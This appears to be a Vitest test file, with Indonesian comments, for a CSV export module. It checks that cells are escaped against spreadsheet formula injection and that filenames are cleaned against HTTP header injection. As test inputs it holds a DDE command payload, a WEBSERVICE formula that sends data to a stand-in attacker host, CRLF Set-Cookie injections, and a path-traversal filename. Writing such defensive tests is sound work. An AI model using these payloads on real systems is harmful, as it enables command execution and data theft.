import { describe, expect, it } from "vitest";
import {
  buildCsv,
  csvContentDisposition,
  csvResponseHeaders,
  escapeCsvCell,
  sanitizeCsvFilename,
} from "@/lib/csv";

/**
 * Kenapa fungsi ini yang dites:
 *
 * Ekspor CSV absensi diunduh admin lalu **dibuka di Excel atau Google Sheets**.
 * Isinya berasal dari kolom yang diisi peserta — nama, catatan laporan, alasan
 * izin. Jadi satu peserta bisa menaruh formula di kolom yang ia kendalikan, dan
 * formula itu berjalan **di mesin admin**, dengan hak akses admin, di luar semua
 * lapisan keamanan aplikasi. CSP tidak berlaku di Excel.
 *
 * Dan kegagalannya sepenuhnya senyap: berkasnya terunduh normal, terbuka normal,
 * dan formulanya berjalan tanpa satu pun peringatan di aplikasi.
 *
 * `sanitizeCsvFilename` adalah cerita kedua: nilainya masuk ke header
 * `Content-Disposition`, jadi CRLF di dalamnya adalah **penyuntikan header HTTP**.
 *
 * Tiap kasus ditulis dengan **asersi ganda** ketika ada bentuk lama yang bisa
 * dibandingkan.
 */

describe("injeksi formula — dijalankan di mesin admin, di luar jangkauan aplikasi", () => {
  it.each([
    ["=", "=1+1"],
    ["+", "+1+1"],
    ["-", "-1+1"],
    ["@", "@SUM(A1:A9)"],
  ])("memberi prefiks kutip pada sel yang dimulai %s", (_pemicu, nilai) => {
    // Tanpa prefiks, Excel mengeksekusinya. `'` membuatnya tetap teks dan tidak
    // ikut tampil sebagai isi sel.
    expect(escapeCsvCell(nilai)).toBe(`"'${nilai}"`);
  });

  it("menetralkan tab dan CR di awal sel — keduanya juga memicu formula", () => {
    expect(escapeCsvCell("\tcmd")).toBe(`"'\tcmd"`);
    expect(escapeCsvCell("\rcmd")).toBe(`"'\rcmd"`);
  });

  it("menetralkan serangan nyata: DDE dan WEBSERVICE", () => {
    // DDE menjalankan program luar; WEBSERVICE/HYPERLINK mengirim isi sel ke
    // server penyerang tanpa interaksi apa pun dari admin.
    const dde = `=cmd|' /C calc'!A0`;
    const bocor = `=WEBSERVICE("https://penyerang.test/?d="&A1)`;
    const tautan = `=HYPERLINK("https://penyerang.test","Klik")`;

    expect(escapeCsvCell(dde).startsWith(`"'=`)).toBe(true);
    expect(escapeCsvCell(bocor).startsWith(`"'=`)).toBe(true);
    expect(escapeCsvCell(tautan).startsWith(`"'=`)).toBe(true);
  });

  it("pemicu di TENGAH sel tidak diprefiks — spreadsheet tidak mengeksekusinya", () => {
    // Penting supaya nilai wajar tidak rusak: "Rp5.000 - Rp10.000", "a@b.com",
    // "2+2 bukan 5" semuanya harus tersimpan apa adanya.
    expect(escapeCsvCell("Rp5.000 - Rp10.000")).toBe(`"Rp5.000 - Rp10.000"`);
    expect(escapeCsvCell("budi@contoh.test")).toBe(`"budi@contoh.test"`);
    expect(escapeCsvCell("nilai 2+2")).toBe(`"nilai 2+2"`);
  });

  it("angka negatif ikut diprefiks — konsekuensi yang diterima", () => {
    // `-5` diprefiks karena `-` adalah pemicu. Hasilnya sel teks, bukan angka.
    // Ini disengaja: tak ada cara membedakan `-5` dari `-1+1` tanpa mengurai
    // formula, dan salah di sisi eksekusi jauh lebih mahal daripada satu sel yang
    // terbaca sebagai teks.
    expect(escapeCsvCell(-5)).toBe(`"'-5"`);
    // Angka positif tidak terpengaruh.
    expect(escapeCsvCell(5)).toBe(`"5"`);
  });

  it("sel kosong tidak diprefiks", () => {
    expect(escapeCsvCell("")).toBe(`""`);
    expect(escapeCsvCell(null)).toBe(`""`);
    expect(escapeCsvCell(undefined)).toBe(`""`);
  });
});

describe("pelolosan struktur CSV", () => {
  it("menggandakan kutip ganda — kalau tidak, sel bisa keluar dari kolomnya", () => {
    expect(escapeCsvCell('dia bilang "ya"')).toBe(`"dia bilang ""ya"""`);
  });

  it("setiap sel dikutip, jadi koma dan newline di dalam isi tidak memecah baris", () => {
    // Ini yang mencegah satu catatan laporan bermuatan koma menggeser seluruh
    // kolom sesudahnya — pergeseran yang membuat data terbaca salah tanpa error.
    expect(escapeCsvCell("Jakarta, Indonesia")).toBe(`"Jakarta, Indonesia"`);
    expect(escapeCsvCell("baris satu\nbaris dua")).toBe(`"baris satu\nbaris dua"`);
  });

  it("gabungan kutip DAN pemicu formula ditangani keduanya", () => {
    // Urutannya menentukan: prefiks dulu, baru gandakan kutip. Kebalikannya akan
    // menggandakan kutip prefiksnya sendiri.
    expect(escapeCsvCell('="a"')).toBe(`"'=""a"""`);
  });

  it("nilai numerik dan boolean dirangkai sebagai string", () => {
    expect(escapeCsvCell(0)).toBe(`"0"`);
    expect(escapeCsvCell(3.14)).toBe(`"3.14"`);
  });
});

describe("buildCsv", () => {
  it("memakai CRLF antar baris — yang dikenali Excel", () => {
    const csv = buildCsv([
      ["Nama", "Hadir"],
      ["Budi", "10"],
    ]);
    expect(csv.endsWith(`"Budi","10"`)).toBe(true);
    expect(csv).toContain(`\r\n`);
    expect(csv.split("\r\n")).toHaveLength(2);
  });

  it("diawali BOM UTF-8 — tanpanya Excel merusak nama ber-aksen", () => {
    const csv = buildCsv([["Nama"]]);
    expect(csv.charCodeAt(0)).toBe(0xfeff);
  });

  it("BOM tidak ikut jadi bagian sel pertama", () => {
    const csv = buildCsv([["Nama"]]);
    expect(csv).toBe(`\ufeff"Nama"`);
  });

  it("baris kosong dan tabel kosong tidak melempar", () => {
    expect(buildCsv([])).toBe("\ufeff");
    expect(buildCsv([[]])).toBe("\ufeff");
  });

  it("setiap sel di setiap baris diloloskan — bukan cuma header", () => {
    const csv = buildCsv([
      ["Catatan"],
      ["=cmd|' /C calc'!A0"],
    ]);
    expect(csv).toContain(`"'=cmd`);
  });
});

describe("sanitizeCsvFilename — nilainya masuk header HTTP", () => {
  it("membuang CRLF — ini penyuntikan header, bukan sekadar nama jelek", () => {
    // Tanpa ini, nama berkas bisa menambahkan header sendiri ke respons.
    const jahat = 'a.csv"\r\nSet-Cookie: sesi=dibajak';
    const bersih = sanitizeCsvFilename(jahat, "export.csv");
    expect(bersih).not.toContain("\r");
    expect(bersih).not.toContain("\n");
    expect(bersih).not.toContain('"');
  });

  it("membuang kutip, titik koma, dan karakter kendali", () => {
    expect(sanitizeCsvFilename(`a"b';c.csv`, "export.csv")).toBe("abc.csv");
    expect(sanitizeCsvFilename("a\u0000b.csv", "export.csv")).toBe("ab.csv");
  });

  it("membuang seluruh komponen path", () => {
    expect(sanitizeCsvFilename("../../etc/passwd.csv", "export.csv")).toBe("passwd.csv");
    expect(sanitizeCsvFilename("C:\\Windows\\a.csv", "export.csv")).toBe("a.csv");
  });

  it("memakai fallback saat tak ada yang tersisa, termasuk untuk `.` dan `..`", () => {
    for (const nilai of ["", "   ", ".", "..", "///", `"';`]) {
      expect(sanitizeCsvFilename(nilai, "export.csv"), JSON.stringify(nilai)).toBe("export.csv");
    }
  });

  it("selalu berakhiran .csv", () => {
    expect(sanitizeCsvFilename("absensi", "export.csv")).toBe("absensi.csv");
    expect(sanitizeCsvFilename("absensi.txt", "export.csv")).toBe("absensi.txt.csv");
    // Tidak digandakan kalau sudah .csv, apa pun kapitalisasinya.
    expect(sanitizeCsvFilename("absensi.csv", "export.csv")).toBe("absensi.csv");
    expect(sanitizeCsvFilename("absensi.CSV", "export.csv")).toBe("absensi.CSV");
  });

  it("meringkas spasi berlebih dan memangkas ujung", () => {
    expect(sanitizeCsvFilename("  absensi   maret  .csv", "export.csv")).toBe("absensi maret .csv");
  });

  it("membatasi panjang ke 120 sebelum menempelkan .csv", () => {
    const hasil = sanitizeCsvFilename("a".repeat(500), "export.csv");
    expect(hasil).toBe("a".repeat(120) + ".csv");
  });
});

describe("csvContentDisposition", () => {
  it("menyediakan fallback ASCII DAN bentuk UTF-8 — nama Indonesia bisa non-ASCII", () => {
    const header = csvContentDisposition("absensi-maret.csv");
    expect(header).toBe(
      `attachment; filename="absensi-maret.csv"; filename*=UTF-8''absensi-maret.csv`,
    );
  });

  it("karakter non-ASCII diganti garis bawah di fallback, tapi utuh di bentuk UTF-8", () => {
    const header = csvContentDisposition("absénsi.csv");
    expect(header).toContain(`filename="abs_nsi.csv"`);
    expect(header).toContain(`filename*=UTF-8''abs%C3%A9nsi.csv`);
  });

  it("nama jahat tidak bisa menambah header — asersi menyeluruh", () => {
    // Satu asersi yang menutup seluruh kelasnya: apa pun masukannya, hasilnya
    // tidak boleh memuat CR, LF, atau kutip ganda di luar sepasang pembungkus.
    for (const jahat of [
      'a.csv"\r\nSet-Cookie: x=1',
      "a.csv\nContent-Length: 0",
      'a";attachment;filename="b.csv',
      "a\u0000.csv",
    ]) {
      const header = csvContentDisposition(jahat);
      expect(header, jahat).not.toMatch(/[\r\n]/);
      expect((header.match(/"/g) ?? []).length, jahat).toBe(2);
    }
  });

  it("nama kosong memakai export.csv", () => {
    expect(csvContentDisposition("")).toContain(`filename="export.csv"`);
  });
});

describe("csvResponseHeaders", () => {
  it("menyertakan charset, disposition, dan no-store", () => {
    const h = csvResponseHeaders("absensi.csv");
    expect(h["Content-Type"]).toBe("text/csv; charset=utf-8");
    expect(h["Content-Disposition"]).toContain(`filename="absensi.csv"`);
    // `no-store` penting: isinya data absensi peserta, jangan sampai tersimpan di
    // cache perantara atau disk browser mesin bersama.
    expect(h["Cache-Control"]).toBe("no-store");
  });
});
